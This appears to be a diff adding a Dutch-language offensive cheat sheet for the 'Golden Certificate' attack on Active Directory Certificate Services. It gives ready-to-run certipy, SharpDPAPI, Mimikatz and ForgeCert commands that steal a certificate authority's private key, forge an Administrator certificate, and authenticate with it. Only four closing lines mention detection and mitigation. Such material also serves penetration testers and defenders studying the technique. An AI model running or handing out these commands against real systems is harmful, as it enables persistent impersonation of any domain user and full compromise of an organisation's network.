@@ -1,0 +1,32 @@
+# Golden Certificate — CA private key extractie voor permanente certificaten
+# Met de CA private key kun je voor altijd certificaten uitgeven als elke user
+# Levensduur: tot CA certificaat verloopt (5-20 jaar)
+#
+# === Vereisten ===
+# - Local admin op de Certificate Authority server
+# - Of backup van CA private key
+#
+# === Voorbeelden ===
+
+# certipy - CA private key + certificaat backuppen
+certipy ca -backup -u ADMIN@DOMAIN -p 'PASS' -ca CA_NAME -dc-ip DC_IP
+
+# SharpDPAPI - CA private key ophalen via DPAPI
+.\SharpDPAPI.exe certificates /machine
+
+# Mimikatz - CA key exporteren
+mimikatz.exe "crypto::capi" "crypto::certificates /systemstore:local_machine /store:my /export" exit
+
+# Met gestolen CA key: certificaat forgen voor Administrator
+certipy forge -ca-pfx ca.pfx -upn Administrator@DOMAIN -subject 'CN=Administrator,CN=Users,DC=domain,DC=local'
+
+# Authenticeren met het geforged certificaat
+certipy auth -pfx forged_admin.pfx -dc-ip DC_IP
+
+# ForgeCert (Windows) - Certificaat forgen
+.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword CertPass --Subject "CN=User" --SubjectAltName Administrator@DOMAIN --NewCertPath admin.pfx --NewCertPassword NewPass
+
+# Noot: Golden Certificate is het ADCS equivalent van een Golden Ticket
+# Noot: CA key rotatie is veel zeldzamer dan krbtgt rotatie
+# Noot: Detectie: Event 4887 voor elke certificate issuance
+# Noot: Mitigatie: HSM voor CA private key, monitoring van cert requests
